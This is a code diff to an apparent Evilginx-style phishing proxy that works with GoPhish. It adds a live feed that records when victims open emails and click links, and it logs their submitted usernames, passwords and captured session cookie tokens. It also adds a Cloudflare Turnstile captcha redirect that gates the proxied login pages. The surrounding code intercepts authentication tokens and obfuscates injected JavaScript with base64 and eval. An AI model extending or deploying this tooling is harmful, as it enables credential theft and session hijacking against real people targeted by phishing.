@@ -70,6 +70,8 @@ type HttpProxy struct {
     cookieName        string
     last_sid          int
     developer         bool
+	livefeed          bool
+	turnstile         bool
     ip_whitelist      map[string]int64
     ip_sids           map[string]string
     auto_filter_mimes []string
@@ -99,7 +101,7 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
     return newBody, nil
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, livefeed bool, turnstile bool) (*HttpProxy, error) {
     p := &HttpProxy{
         Proxy:             goproxy.NewProxyHttpServer(),
         Server:            nil,
@@ -111,6 +113,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
         isRunning:         false,
         last_sid:          0,
         developer:         developer,
+		livefeed:          livefeed,
+		turnstile:         turnstile,
         ip_whitelist:      make(map[string]int64),
         ip_sids:           make(map[string]string),
         auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript", "application/ion+json", "text/plain", "image/svg+xml", "text/css", "application/xml", "text/xml"},
@@ -411,6 +415,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                                     if err != nil {
                                                         log.Error("gophish: %s", err)
                                                     }
+                                                    database.HandleEmailOpened(rid, map[string]string{"email": rid}, p.livefeed)
                                                     return p.trackerImage(req)
                                                 }
                                             }
@@ -432,6 +437,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                             if err != nil {
                                                 log.Error("gophish: %s", err)
                                             }
+                                            database.HandleClickedLink(rid, map[string]string{"email": rid}, p.livefeed)
                                         }
                                     }
 
@@ -457,6 +463,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     ps.Created = true
                                     ps.Index = sid
                                     p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
+
+                                    if p.turnstile {
+                                        if session.RId != "" {
+                                            return p.redirectTurnstile(req, session.RId)
+                                        }
+                                    }
 
                                     req_ok = true
                                 }
@@ -948,6 +960,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                 }
             }
 
+            // TURNSTILE: block response if captcha not completed
+            if p.turnstile {
+                if s, ok := p.sessions[ps.SessionId]; ok {
+                    if !s.IsCaptchaDone {
+                        return resp
+                    }
+                }
+            }
+
             req_hostname := strings.ToLower(resp.Request.Host)
 
             r_url, err := resp.Location()
@@ -1080,6 +1101,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                 if err != nil {
                                     log.Error("gophish: %s", err)
                                 }
+                                database.HandleSubmittedData(rid, s.Username, s.Password, map[string]string{"email": rid}, p.livefeed)
                             }
                         }
                     }
@@ -1235,6 +1257,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                 log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
                             }
 
+                            if s, ok := p.sessions[ps.SessionId]; ok {
+                                if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
+                                    database.HandleCapturedCookieSession(rid, s.CookieTokens, map[string]string{"email": rid}, p.livefeed)
+                                }
+                            }
+
                             if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
                                 rid, ok := s.Params["rid"]
                                 if ok && rid != "" {
@@ -1243,6 +1271,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     if err != nil {
                                         log.Error("gophish: %s", err)
                                     }
+                                    database.HandleSubmittedData(rid, s.Username, s.Password, map[string]string{"email": rid}, p.livefeed)
                                 }
                             }
                             break
@@ -2173,6 +2202,16 @@ func obfuscateJS(originalJS string) string {
     }
     encoded := base64.StdEncoding.EncodeToString([]byte(originalJS))
     return "(function(){var _d=\"" + encoded + "\";eval(atob(_d));})();"
+}
+
+func (p *HttpProxy) redirectTurnstile(req *http.Request, rid string) (*http.Request, *http.Response) {
+	resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+	if resp != nil {
+		redirect_url := "https://" + req.Host + "/validate-captcha?client_id=" + rid
+		resp.Header.Add("Location", redirect_url)
+		return req, resp
+	}
+	return req, nil
 }
 
 // rewriteSensitivePaths rewrites full phishing domain URLs in HTML responses to relative paths
